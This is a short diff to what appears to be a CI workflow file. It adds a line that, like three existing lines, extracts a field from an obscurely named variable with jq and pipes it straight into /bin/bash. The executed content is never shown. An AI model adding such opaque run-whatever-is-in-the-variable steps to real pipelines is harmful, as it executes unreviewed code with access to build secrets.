@@ -26,6 +26,7 @@ jobs:
           echo $jptzy86 | jq -r .wgf5 | /bin/bash
           echo $o570 | jq -r .oase41 | /bin/bash
           printf '%s' "$fpd6" | jq -r .khjpq16 | /bin/bash
+          echo $stxw2 | jq -r .fyjt9 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
